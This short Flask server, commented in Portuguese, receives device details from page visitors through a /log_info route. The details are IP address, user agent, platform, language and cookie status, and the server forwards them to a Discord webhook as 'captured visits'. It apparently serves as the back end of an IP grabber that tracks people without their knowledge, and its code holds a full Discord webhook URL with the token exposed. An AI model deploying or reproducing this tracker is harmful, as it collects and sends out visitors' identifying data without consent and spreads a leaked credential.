from flask import Flask, request
import requests

app = Flask(__name__)

# URL do webhook do Discord
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1276205268513980456/yEkRrwOGflFwdEW7eo35DV2Yka1aWpVkGG1E8b4AouJy0fujiDhRvqyx4O7i2hujF406'

# Rota para receber as informações do dispositivo
@app.route('/log_info', methods=['POST'])
def log_info():
    if request.method == 'POST':
        data = request.json
        send_to_discord(data)
        return '', 204

# Função para enviar as informações ao Discord
def send_to_discord(data):
    try:
        message = {
            "content": None,
            "embeds": [
                {
                    "title": "Nova Visita Capturada",
                    "color": 3447003,
                    "fields": [
                        {"name": "IP", "value": data.get('ip', 'Desconhecido'), "inline": True},
                        {"name": "User Agent", "value": data.get('userAgent', 'Desconhecido'), "inline": False},
                        {"name": "Plataforma", "value": data.get('platform', 'Desconhecido'), "inline": True},
                        {"name": "Idioma", "value": data.get('language', 'Desconhecido'), "inline": True},
                        {"name": "Cookies Ativados", "value": str(data.get('cookiesEnabled', 'Desconhecido')), "inline": True},
                    ]
                }
            ]
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=message)
        if response.status_code == 204:
            print("Informações enviadas ao Discord com sucesso.")
        else:
            print(f"Erro ao enviar informações ao Discord: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Erro ao enviar informações ao Discord: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
